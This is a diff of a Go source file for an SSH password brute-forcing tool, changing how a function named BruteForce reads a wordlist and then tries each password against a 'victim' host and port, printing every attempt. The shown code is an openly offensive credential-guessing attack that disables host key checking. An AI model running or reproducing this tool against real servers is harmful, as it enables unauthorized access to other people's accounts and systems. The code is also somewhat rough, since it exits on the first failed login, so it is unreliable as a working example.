@@ -60,8 +60,8 @@ fmt.Printf("Success %v:%v is up! \n",check_values.address,check_values.port)
 //fmt.Println(conn)
 defer fmt.Printf("Time: %v\n",time.Now())
   }
-		return &check_values
-	}
+                return &check_values
+        }
 
     func BruteForce(sshuser string, wordlist string, victim string, port int) *Verify{
       brute := Verify{address: victim, port: port, name: sshuser, pass_file: wordlist}
@@ -72,24 +72,29 @@ log.Fatal(err)
       }
       defer passwords.Close()
       readlines := bufio.NewScanner(passwords)
+      readlines.Split(bufio.ScanLines)
+      var fileTextLines []string
       for readlines.Scan(){
+fileTextLines = append(fileTextLines,readlines.Text())
+      }
+      passwords.Close()
+      for _, eachline := range fileTextLines{
     config := &ssh.ClientConfig{
-	User: brute.name,
-	Auth: []ssh.AuthMethod{
-		ssh.Password(readlines.Text()),
-	},
+        User: brute.name,
+        Auth: []ssh.AuthMethod{
+                ssh.Password(string(eachline)),
+        },
     HostKeyCallback: ssh.InsecureIgnoreHostKey(),
 
 }
+fmt.Printf("[SSH]=> %v@%v[password:%v] \n",brute.name,brute.address,eachline)
 if err := readlines.Err(); err != nil{
 log.Fatal(err)
 }
 client, err := ssh.Dial("tcp", brute_target, config)
-
 if err != nil {
   log.Fatal(err)
 }
-
 defer client.Close()
 }
 return &brute
